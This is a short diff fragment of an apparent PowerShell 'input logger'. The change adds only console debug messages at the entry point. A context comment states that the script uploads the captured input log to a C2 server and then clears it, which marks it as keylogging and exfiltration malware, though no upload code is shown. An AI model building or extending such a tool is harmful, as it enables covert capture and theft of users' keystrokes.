@@ -127,6 +127,10 @@ function Start-Logging
 }
 
 #ENTRY POINT
+#Write startup message to console
+Write-Console -Body ("Input logger starting.") -IssueNumber $issueNumber
+Write-Host "DEBUG: Input logger starting."
+
 #Upload the input log to C2, then clear it.
 try 
 {
